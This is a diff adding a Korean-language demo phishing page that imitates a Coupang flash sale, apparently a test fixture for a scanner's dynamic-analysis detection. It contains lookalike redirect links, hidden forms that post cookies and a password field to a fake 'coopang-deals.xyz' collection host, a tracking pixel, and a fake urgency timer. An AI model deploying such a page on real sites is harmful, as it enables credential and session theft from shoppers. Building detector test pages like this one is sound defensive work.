@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<title>쿠팡 특가 이벤트</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Malgun Gothic', sans-serif; background: #f5f5f5; }
+  .header { background: #c00000; padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; }
+  .header .logo { color: white; font-size: 22px; font-weight: 900; }
+  .header .cart { color: white; font-size: 13px; cursor: pointer; }
+  .hero { background: linear-gradient(135deg, #c00000, #ff4444); padding: 40px 24px; text-align: center; color: white; }
+  .hero h1 { font-size: 28px; font-weight: 900; margin-bottom: 8px; }
+  .hero p { font-size: 15px; opacity: 0.9; margin-bottom: 20px; }
+  .hero .countdown { background: rgba(0,0,0,0.3); display: inline-block; padding: 8px 20px; border-radius: 20px; font-size: 18px; font-weight: 700; letter-spacing: 2px; }
+  .container { max-width: 900px; margin: 24px auto; padding: 0 20px; }
+  .products { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+  .product-card { background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.06); cursor: pointer; transition: transform 0.2s; }
+  .product-card:hover { transform: translateY(-2px); }
+  .product-card .img { height: 140px; background: #f0f0f0; display: flex; align-items: center; justify-content: center; font-size: 40px; }
+  .product-card .info { padding: 12px; }
+  .product-card .name { font-size: 13px; color: #333; margin-bottom: 6px; line-height: 1.4; }
+  .product-card .price { font-size: 18px; font-weight: 900; color: #c00000; }
+  .product-card .original { font-size: 12px; color: #999; text-decoration: line-through; }
+  .product-card .discount { font-size: 12px; color: #ff4444; font-weight: 700; }
+  .buy-btn { width: 100%; padding: 10px; background: #c00000; color: white; border: none; font-size: 13px; font-weight: 700; cursor: pointer; }
+  .buy-btn:hover { background: #a00000; }
+
+  .demo-badge { position: fixed; top: 10px; right: 10px; background: #FF6F00; color: white; padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: 700; z-index: 9999; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
+  .demo-hint { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.85); color: white; padding: 10px 20px; border-radius: 20px; font-size: 12px; z-index: 9999; white-space: nowrap; }
+
+  /* 숨겨진 악성 요소들 (동적 분석에서만 탐지) */
+  .hidden-form { display: none; }
+  .tracking-pixel { position: absolute; width: 1px; height: 1px; opacity: 0; }
+</style>
+</head>
+<body>
+<div class="demo-badge">🟠 시나리오 4: 동적 분석 탐지</div>
+<div class="demo-hint">💡 링크 호버 → 정밀검사 ON 시 숨겨진 리디렉션/JS 탐지</div>
+
+<div class="header">
+  <div class="logo">C○○PANG</div>
+  <div class="cart">🛒 장바구니 0</div>
+</div>
+
+<div class="hero">
+  <h1>🔥 블랙프라이데이 특가</h1>
+  <p>오늘 자정까지만! 최대 90% 할인</p>
+  <div class="countdown" id="timer">23:47:12</div>
+</div>
+
+<div class="container">
+  <div class="products">
+    <div class="product-card">
+      <div class="img">📱</div>
+      <div class="info">
+        <div class="name">갤럭시 S25 Ultra 256GB 티타늄 블랙</div>
+        <div class="original">1,899,000원</div>
+        <div class="price">189,900원</div>
+        <div class="discount">▼ 90% 할인</div>
+      </div>
+      <!-- 보기엔 쿠팡 링크처럼 보이지만 실제로는 악성 도메인으로 리디렉트 -->
+      <a href="http://coopang-deals.xyz/redirect?item=1&token=eyJhbGciOiJIUzI1NiJ9" style="text-decoration:none;">
+        <button class="buy-btn">지금 구매하기</button>
+      </a>
+    </div>
+
+    <div class="product-card">
+      <div class="img">💻</div>
+      <div class="info">
+        <div class="name">맥북 프로 M4 14인치 스페이스 그레이</div>
+        <div class="original">2,990,000원</div>
+        <div class="price">299,000원</div>
+        <div class="discount">▼ 90% 할인</div>
+      </div>
+      <a href="http://coopang-deals.xyz/redirect?item=2&token=eyJhbGciOiJIUzI1NiJ9" style="text-decoration:none;">
+        <button class="buy-btn">지금 구매하기</button>
+      </a>
+    </div>
+
+    <div class="product-card">
+      <div class="img">🎮</div>
+      <div class="info">
+        <div class="name">PS5 디스크 에디션 + 게임 3종 번들</div>
+        <div class="original">899,000원</div>
+        <div class="price">89,900원</div>
+        <div class="discount">▼ 90% 할인</div>
+      </div>
+      <a href="http://coopang-deals.xyz/redirect?item=3&token=eyJhbGciOiJIUzI1NiJ9" style="text-decoration:none;">
+        <button class="buy-btn">지금 구매하기</button>
+      </a>
+    </div>
+  </div>
+
+  <!-- 동적 분석 탐지 요소들 -->
+
+  <!-- 1. form 자체 display:none → has_hidden_form 탐지 -->
+  <form action="http://coopang-deals.xyz/collect" method="POST" id="data-harvest" style="display:none;">
+    <input type="hidden" name="cookies" id="cookie-data">
+    <input type="hidden" name="fingerprint" id="browser-fp">
+    <input type="hidden" name="session" value="auto-harvest">
+  </form>
+
+  <!-- 2. visibility:hidden + 비밀번호 필드 → has_password_field + has_hidden_form 탐지 -->
+  <form action="http://coopang-deals.xyz/login-steal" method="POST" style="visibility:hidden;position:absolute;top:-9999px;">
+    <input type="text" name="id" placeholder="아이디">
+    <input type="password" name="pw" placeholder="비밀번호">
+  </form>
+
+  <!-- 3. tracking pixel → external_requests 탐지 -->
+  <img style="position:absolute;width:1px;height:1px;opacity:0;" src="http://track.coopang-deals.xyz/pixel.gif?uid=auto" alt="">
+</div>
+
+<script>
+// 카운트다운 타이머 (긴급성 조성)
+let seconds = 23 * 3600 + 47 * 60 + 12;
+setInterval(() => {
+  seconds--;
+  if (seconds < 0) seconds = 86399;
+  const h = String(Math.floor(seconds / 3600)).padStart(2, '0');
+  const m = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
+  const s = String(seconds % 60).padStart(2, '0');
+  document.getElementById('timer').textContent = `${h}:${m}:${s}`;
+}, 1000);
+
+// 동적 분석에서 탐지될 난독화된 코드 (시연용 — 실제로는 무해)
+// 실제 악성 페이지에서는 아래와 같은 패턴으로 쿠키/세션을 탈취함
+const _0x4f2a = ['cookie', 'userAgent', 'querySelector'];
+// document[_0x4f2a[0]] → document.cookie 처럼 난독화
+console.log('[시연] 동적 분석 시 탐지될 패턴: 숨겨진 form, tracking pixel, 난독화 JS, 외부 리디렉션');
+console.log('[시연] 정적 분석만으로는 coopang-deals.xyz 도메인 탐지 가능');
+console.log('[시연] 동적 분석에서 추가 탐지: hidden form action, tracking pixel src');
+</script>
+</body>
+</html>
